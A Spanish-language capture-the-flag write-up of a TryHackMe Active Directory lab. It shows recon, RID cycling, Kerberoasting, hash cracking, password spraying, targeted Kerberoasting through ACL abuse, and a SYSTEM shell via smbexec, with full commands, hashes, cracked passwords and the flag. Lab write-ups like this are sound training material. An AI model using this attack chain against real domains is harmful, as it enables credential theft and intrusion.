---
tags:
title: Operation Endgame - Hard (THM)
permalink: /OperationEndgame-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.66.158.202
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 12:38 -0400
Initiating Ping Scan at 12:38
Scanning 10.66.158.202 [4 ports]
Completed Ping Scan at 12:38, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:38
Completed Parallel DNS resolution of 1 host. at 12:38, 0.50s elapsed
Initiating SYN Stealth Scan at 12:38
Scanning 10.66.158.202 [65535 ports]
Discovered open port 80/tcp on 10.66.158.202
Discovered open port 3389/tcp on 10.66.158.202
Discovered open port 135/tcp on 10.66.158.202
Discovered open port 445/tcp on 10.66.158.202
Discovered open port 53/tcp on 10.66.158.202
Discovered open port 139/tcp on 10.66.158.202
Discovered open port 443/tcp on 10.66.158.202
Discovered open port 88/tcp on 10.66.158.202
Discovered open port 49716/tcp on 10.66.158.202
Discovered open port 49667/tcp on 10.66.158.202
Discovered open port 49664/tcp on 10.66.158.202
Discovered open port 464/tcp on 10.66.158.202
Discovered open port 49681/tcp on 10.66.158.202
Discovered open port 3269/tcp on 10.66.158.202
Discovered open port 49673/tcp on 10.66.158.202
Discovered open port 47001/tcp on 10.66.158.202
Discovered open port 49792/tcp on 10.66.158.202
Discovered open port 49711/tcp on 10.66.158.202
Discovered open port 49677/tcp on 10.66.158.202
Discovered open port 389/tcp on 10.66.158.202
Discovered open port 9389/tcp on 10.66.158.202
Discovered open port 636/tcp on 10.66.158.202
Discovered open port 3268/tcp on 10.66.158.202
Discovered open port 593/tcp on 10.66.158.202
Discovered open port 49672/tcp on 10.66.158.202
Discovered open port 49666/tcp on 10.66.158.202
Discovered open port 49671/tcp on 10.66.158.202
Discovered open port 49665/tcp on 10.66.158.202
Discovered open port 49675/tcp on 10.66.158.202
Discovered open port 49723/tcp on 10.66.158.202
Completed SYN Stealth Scan at 12:38, 11.02s elapsed (65535 total ports)
Nmap scan report for 10.66.158.202
Host is up, received reset ttl 126 (0.17s latency).
Scanned at 2026-03-17 12:38:25 EDT for 11s
Not shown: 45767 closed tcp ports (reset), 19738 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 126
80/tcp    open  http             syn-ack ttl 126
88/tcp    open  kerberos-sec     syn-ack ttl 126
135/tcp   open  msrpc            syn-ack ttl 126
139/tcp   open  netbios-ssn      syn-ack ttl 126
389/tcp   open  ldap             syn-ack ttl 126
443/tcp   open  https            syn-ack ttl 126
445/tcp   open  microsoft-ds     syn-ack ttl 126
464/tcp   open  kpasswd5         syn-ack ttl 126
593/tcp   open  http-rpc-epmap   syn-ack ttl 126
636/tcp   open  ldapssl          syn-ack ttl 126
3268/tcp  open  globalcatLDAP    syn-ack ttl 126
3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
3389/tcp  open  ms-wbt-server    syn-ack ttl 126
9389/tcp  open  adws             syn-ack ttl 126
47001/tcp open  winrm            syn-ack ttl 126
49664/tcp open  unknown          syn-ack ttl 126
49665/tcp open  unknown          syn-ack ttl 126
49666/tcp open  unknown          syn-ack ttl 126
49667/tcp open  unknown          syn-ack ttl 126
49671/tcp open  unknown          syn-ack ttl 126
49672/tcp open  unknown          syn-ack ttl 126
49673/tcp open  unknown          syn-ack ttl 126
49675/tcp open  unknown          syn-ack ttl 126
49677/tcp open  unknown          syn-ack ttl 126
49681/tcp open  unknown          syn-ack ttl 126
49711/tcp open  unknown          syn-ack ttl 126
49716/tcp open  unknown          syn-ack ttl 126
49723/tcp open  unknown          syn-ack ttl 126
49792/tcp open  unknown          syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.97 seconds
           Raw packets sent: 106159 (4.671MB) | Rcvd: 46013 (1.841MB)
-e [*] IP: 10.66.158.202
[*] Puertos abiertos: 53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,9389,47001,49664,49665,49666,49667,49671,49672,49673,49675,49677,49681,49711,49716,49723,49792
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,80,88,135,139,389,443,445,464,593,636,3268,3269,3389,9389,47001,49664,49665,49666,49667,49671,49672,49673,49675,49677,49681,49711,49716,49723,49792 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-17 12:38 -0400
Nmap scan report for 10.66.158.202
Host is up (0.17s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-03-17 16:38:45Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?
|_ssl-date: 2026-03-17T16:40:57+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=thm-LABYRINTH-CA
| Not valid before: 2023-05-12T07:26:00
|_Not valid after:  2028-05-12T07:35:59
| tls-alpn:
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: thm.local, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2026-03-17T16:40:57+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ad.thm.local
| Not valid before: 2026-03-16T16:32:02
|_Not valid after:  2026-09-15T16:32:02
| rdp-ntlm-info:
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: AD
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: ad.thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-17T16:39:44+00:00
9389/tcp  open  mc-nmf            .NET Message Framing
47001/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc             Microsoft Windows RPC
49665/tcp open  msrpc             Microsoft Windows RPC
49666/tcp open  msrpc             Microsoft Windows RPC
49667/tcp open  msrpc             Microsoft Windows RPC
49671/tcp open  msrpc             Microsoft Windows RPC
49672/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  msrpc             Microsoft Windows RPC
49677/tcp open  msrpc             Microsoft Windows RPC
49681/tcp open  msrpc             Microsoft Windows RPC
49711/tcp open  msrpc             Microsoft Windows RPC
49716/tcp open  msrpc             Microsoft Windows RPC
49723/tcp open  msrpc             Microsoft Windows RPC
49792/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: AD; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-03-17T16:39:44
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.87 seconds
```
### Enumerate users

Luego de una enumeración básica, solo que quedo realizar un `RID Cycling` para enumerar usuarios validos del dominio.

```bash
zs1n@ptw ~> nxc smb thm.local -u guest -p '' --rid-brute
SMB         10.66.158.202   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.66.158.202   445    AD               [+] thm.local\guest:
SMB         10.66.158.202   445    AD               498: THM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.66.158.202   445    AD               500: THM\Administrator (SidTypeUser)
SMB         10.66.158.202   445    AD               501: THM\Guest (SidTypeUser)
SMB         10.66.158.202   445    AD               502: THM\krbtgt (SidTypeUser)
SMB         10.66.158.202   445    AD               512: THM\Domain Admins (SidTypeGroup)
SMB         10.66.158.202   445    AD               513: THM\Domain Users (SidTypeGroup)
SMB         10.66.158.202   445    AD               514: THM\Domain Guests (SidTypeGroup)
SMB         10.66.158.202   445    AD               515: THM\Domain Computers (SidTypeGroup)
SMB         10.66.158.202   445    AD               516: THM\Domain Controllers (SidTypeGroup)
SMB         10.66.158.202   445    AD               517: THM\Cert Publishers (SidTypeAlias)
SMB         10.66.158.202   445    AD               518: THM\Schema Admins (SidTypeGroup)
SMB         10.66.158.202   445    AD               519: THM\Enterprise Admins (SidTypeGroup)
SMB         10.66.158.202   445    AD               520: THM\Group Policy Creator Owners (SidTypeGroup)
SMB         10.66.158.202   445    AD               521: THM\Read-only Domain Controllers (SidTypeGroup)
SMB         10.66.158.202   445    AD               522: THM\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.66.158.202   445    AD               525: THM\Protected Users (SidTypeGroup)
SMB         10.66.158.202   445    AD               526: THM\Key Admins (SidTypeGroup)
SMB         10.66.158.202   445    AD               527: THM\Enterprise Key Admins (SidTypeGroup)
SMB         10.66.158.202   445    AD               553: THM\RAS and IAS Servers (SidTypeAlias)
SMB         10.66.158.202   445    AD               571: THM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.66.158.202   445    AD               572: THM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.66.158.202   445    AD               1008: THM\AD$ (SidTypeUser)
SMB         10.66.158.202   445    AD               1109: THM\DnsAdmins (SidTypeAlias)
SMB         10.66.158.202   445    AD               1110: THM\DnsUpdateProxy (SidTypeGroup)
SMB         10.66.158.202   445    AD               1114: THM\SHANA_FITZGERALD (SidTypeUser)
SMB         10.66.158.202   445    AD               1115: THM\CAREY_FIELDS (SidTypeUser)
SMB         10.66.158.202   445    AD               1116: THM\DWAYNE_NGUYEN (SidTypeUser)
..snip..
```

Con los mismos use la siguiente `regex` para poder colocar solo los nombres del mismo en un archivo `users`.

```bash
zs1n@ptw ~> cat users| grep "SidTypeUser" | awk '{print$6}' | tr '\\' ' ' | awk '{print $2}' | sponge users
```
## Auth as cody_roy
### Kerberoasting

Use el mismo para realizar un `kerberoasting` contra todos los usuarios que recolecte. Obteniendo así, varios hashes de varios usuarios.

```bash
zs1n@ptw ~> impacket-GetUserSPNs thm.local/guest -dc-ip 10.66.158.202 -no-pass -usersfile users
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

..snip..
$krb5tgs$23$*CODY_ROY$THM.LOCAL$CODY_ROY*$3930094a7b5f0d6df0bbfa6854615eaf$7ab237f51cc9382ed6126e427085aa1b7ea7d1e69de8391fb50100975be8891289a5e2cf6fe2c069a5c1ae73a1c78d842807df85a37775c7754634be942066439de9b5c299bfc6f4c42d3ef9bb9e6617c9ba0f8378890bda7cc5be9affc2d63ccaa6ff224a611fa087dc8bd2b691b112534170bed7ecd38bf1ea5d2ca29b8c9c30639457b778e25632a434fc24ffc206bd5430bc4ab22983f5c7a14c0ec5789cfafb3029539fe80165f78d24b8b716fb9ade441e8f3334eaf8636eb55035ff4d6288a235ac01c5a2af00b8adbf4d1f394b1132b62f7a5773a6a9d00d98b545e25d3a5a8165b5b48d3ce86c628ea6719dda40ba657d600162c6f2ecd73bfb9bc34aa35e859704f32ee97d0754ed1eb1a2440cf033d3ff260ec35a5930e858c2d1eeda00d854db0ab8f4b737a761ff6ee810eead678b8fa4b81ee4b7b0ad6ef5426731cbf3df8defaeb6e8d984f881659b4d56f41b55d62490b269708a430a22d6e8f734ea7041487ffb0ebae2e28d0ead8beb243e5a0ca17c291aadb2c6630abbff28315896ccefbcb2ddb7286ef6717f32976678c3e000805bd7883ad62ca7c76cfcdad67aff8df235cc289e5457b709f8344c8be20622fa107a97a9a84154e5293005e128987b78a4c0c7d76b47255e92ddfcd8eead04e535be0a13e90595dc7fbe739d5c49f128a1d8e50b79342a0b0b53ae7e4b70a200e03ff4095db6c5852b3f0fc3a1a8e40f6b47a9b62eac8d345275a727c76b5d020af447d7f1e50e225540eaebddebf39e4c8a4c31b874ac0d8047219145bba2683dad89ac51505884dcfe5b0b5874bbfca60d10dd64e4e207a6b121f32150709671879e6c312c685d7f0e4330efc77e9916c3512c3f31d71e04cab55cb0ee039a21dd95b70e904aba5d9341c898955bbad1efa8f8899b9d633541d5c9687170ed907527fe3ac1719749e19d4c7a81ed1cb6f5114a6e7c87961a001df3aef5af1bbb4ffb567af7cc83a0f9732e6cebd77af2b878c86d13876d21fbcb3c40813cfecea1f6a29426180d481b902da0eee255865b80607a4b07fcef2910be76e04af80f9c67dde84a2b295e48b8d94f5636adc931e3557a647fd7f459c7ee112951cb1345f3c5b01012184fed53116d3f5ac4a40ef58d9f622893ab10e8a8e39c0fdbdf6ef09a096967d534940cd57968ecaa5bd061b898c0f133d6d0c5303c7d71c4a71ab5306545f8b9b91cde0e6544dcf3d601c85185afa6df275513e77cd89cf0fcf681a95e0f45cc6c924c25b774bce83df95e601c312998a20fb8bdbefd1781325cdeb41c51d1a387961774d7fa4c5cddc2e974dfee952cd8f58bf670685b6fafd0dde398dad8e0787f504b3cb69934b101a435c0d262543f8ba15f8d0537e89d272ab2422a97
..snip..
```
### Crack password

Coloque todos dentro de un archivo y solo logre romper el del usuario `cody_roy`.

```bash
zs1n@ptw ~>  j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
MKO)mko0         (?)
1g 0:00:00:00 DONE (2026-03-17 12:48) 3.571g/s 2527Kp/s 2527Kc/s 2527KC/s MOSSIMO..LEANN1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Validate creds

Valide las mismas credenciales con `nxc`.

```bash
zs1n@ptw ~> nxc smb 10.66.158.202 -u CODY_ROY -p 'MKO)mko0'
SMB         10.66.158.202   445    AD               [*] Windows 10 / Server 2019 Build 17763 x64 (name:AD) (domain:thm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.66.158.202   445    AD               [+] thm.local\CODY_ROY:MKO)mko0
```
## Auth as zachary_hunt
### Collect data

Use `rusthound-ce` junto con las credenciales del usuario.

```bash
zs1n@ptw ~> rusthound-ce -d thm.local -f ad.thm.local -i 10.66.161.129 -u cody_roy -p 'MKO)mko0' -z -c All
---------------------------------------------------
Initializing RustHound-CE at 13:15:11 on 03/17/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-03-17T17:15:11Z INFO  rusthound_ce] Verbosity level: Info
[2026-03-17T17:15:11Z INFO  rusthound_ce] Collection method: All
[2026-03-17T17:15:11Z INFO  rusthound_ce::ldap] Connected to THM.LOCAL Active Directory!
..snip..

RustHound-CE Enumeration Completed at 13:15:17 on 03/17/26! Happy Graphing!
```
### Password spray

Use la contraseña de este usuario para validar que la misma sea valida para algún otro usuario, viendo que las mismas también son validas para el usuario `zachary_hunt`.

```bash
zs1n@ptw ~> kerbrute passwordspray --dc 10.66.161.129 -d thm.local users 'MKO)mko0'

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/17/26 - Ronnie Flathers @ropnop

2026/03/17 13:43:16 >  Using KDC(s):
2026/03/17 13:43:16 >  	10.66.161.129:88

2026/03/17 13:43:18 >  [+] VALID LOGIN:	 CODY_ROY@thm.local:MKO)mko0
2026/03/17 13:43:28 >  [+] VALID LOGIN:	 ZACHARY_HUNT@thm.local:MKO)mko0
2026/03/17 13:43:34 >  Done! Tested 492 logins (2 successes) in 18.157 seconds
```
## Shell as jerri_lancaster
### ACL abuse

Viendo las acls de este usuario, vi que tiene la capacidad de performar un `kerberoasting attack` contra el usuario `jerri_lancaster`.

![image-center](/assets/images/Pasted image 20260317144646.png)
### Targeted Kerberoast

Por lo que use [targetedKerberoast.py](github.com/ShutdownRepo/targetedKerberoast) para realizar dicha accion.

```bash
zs1n@ptw ~> python3 targetedKerberoast.py -v -d 'thm.local' -u 'zachary_hunt' -p 'MKO)mko0' --request-user jerri_lancaster
[*] Starting kerberoast attacks
[*] Attacking user (jerri_lancaster)
[VERBOSE] SPN added successfully for (JERRI_LANCASTER)
[+] Printing hash for (JERRI_LANCASTER)
$krb5tgs$23$*JERRI_LANCASTER$THM.LOCAL$thm.local/JERRI_LANCASTER*$8bd8af893eab8faf127968d4da7b6ecb$0b9d4e8bf503dbcb09bd8cc604d60aefc930645b96f2c97fd97c65593240a13a9f319d08f11e44ebd88f832c690c797eea2806c9dc0862e98ed72894910149b4df33e0f0ba98d89d6644a701ac1e294e8dee40e31d7ccc87a527f7afc87f8eaf1f8d0786bc52a369c901a7a8c4aa7196fd56c008c0d5d2864b97f6fb43270df2615f2b1bc38f177f9a9858b2b794354b99e6893335f1f2e17c050ca3b573cd5a26a8eed9ec59e14af460462c16b20f6267db7fe1fd05edd8bbfd589176799daa816af3612dae7ca6bbc38887f06cd6eb313566731a74351f1fb4bc975ce69f1130d5e4431b5a92a19c47e3c0c7f5bf6c025c4c21a75e90e0a0ab8b53a4eece928bd7ed747c8a5abd459d3fade5a8f4c73f93dc8ae272863dc887410a79f4bced40bb129a0f576ccbd48fe967318de58d8020dabdff7fec61f16e904b96aade500e972497b96d0dbce4caff069bd516fc1f90c1364e7560b33b6b9eccbb2a476bc56cfa6be4048a8fa6bf530797a02fd2ee49833cf69c6b678aaedddc607fca827a18e016c45b23a9f336d61affd2dafa83a6ec3d3280f3e7773b6da7b0d4692dc0aa47a5f5015cec49fc18a1cf03b5f1d0e8b8dca27597ab9e081ada63012422137d1773975f100b3a0f3549bcea7ca2c0e9165a7fbddad3cb2ef0d0cff28cd9a56d3efd3cea6922feee51c78393ddf4739e40761f779ca0c5c0f8889afb342e6bd31991fbb408d21368a215eeed4e667a1ed5f9e04dfedb775490ac7844572e0a4015b7e3638dbea8b8dbd06d631525e292fba61d980cd36d189d703e9521781f8c0df474c36f42b2137671963d064afae8ff07e1d8b60d195700adc6c3898160ce37760a84afdfa3af04d76bf96a15ea28ed6b40ba6addaf5901ee4495e7d402822542b307e7f8cb91f0c54c91e9897deecfadb5d4ecd774068ea164c541ccc44487c9380d9cdd4665a4f4cef0e5ac237599499fa41d73de4972ff18553000e1dfc88916367cc7e4c95718a051c8a2f1f55b7df87d516a5c6a7122fbf50de88aa6dabbd6270d357ddb57d69af04527fa6cfab0fc4f7e6d94c2bc424b412a7e169273e62e42d3fef99a931f5999e2dc9b034ffc4be326cf11fdf4df34b5d2f9a1a94ce7f35b6dcd48a854935dc363a3ef15a5cf2715e04848cea283c0672f20fbc3a98acd24e3dd1a94f923a9e41aef28dd17a68a3dd28c1a555d27f14f550502d742fbccaee24604b516b3e914506806b43279219e097c859f0ca62a70f0d78f8791f0d8d17a8e4fbfff3bcf6fc787abe045856c798aaa16fd3c835cb1a3a293d8ddc7ac41898130defa8c5735952af72b00e2f0119ddff728e90ef1b4ecc872e87ebbbb12e50f0d8abd4f46d39c25a2451bdd9d4536f41d4dacf09595b669eae2badf688b16396d26f2689fd784c7180f258f05f39857fc76dbaf8a02095d1b8297965680bed842c419ca0bfd68d19d6886b058e79adadfa54fa525a274bdcd3e139b8121fae93898960bee38a30240dfd4f3731a
[VERBOSE] SPN removed successfully for (JERRI_LANCASTER)
```
### Crack password

Use `john` para romper el mismo hash que obtuve.

```bash
zs1n@ptw ~> j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
lovinlife!       (?)
1g 0:00:00:00 DONE (2026-03-17 13:47) 3.225g/s 2018Kp/s 2018Kc/s 2018KC/s lrcjks..love2cook
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Shell

Como este usuario es miembro del grupo de RDP me conecte con `xfreerdp3`.

```bash
xfreerdp3 /v:<ip> /u:jerri_lancaster /p:'lovinlife!'
```
## Shell as SANFORD_DAUGHERTY

Vi que el directorio `C:\Scripts` habia un archivo con las credenciales del usuario `SANFORD_DAUGHERTY`.

![image-center](/assets/images/Pasted image 20260317150241.png)
### Shell

Por lo que use `smbpsexec` para conectarme como este usuario.

```powershell
zs1n@ptw ~> impacket-smbexec thm.local/SANFORD_DAUGHERTY:'RESET_ASAP123'@ad.thm.local -dc-ip 10.66.161.129
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>cd C:\Users\Administrator\Desktop
[-] You can't CD under SMBEXEC. Use full paths.
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt.txt
THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
```

`~Happy Hacking.`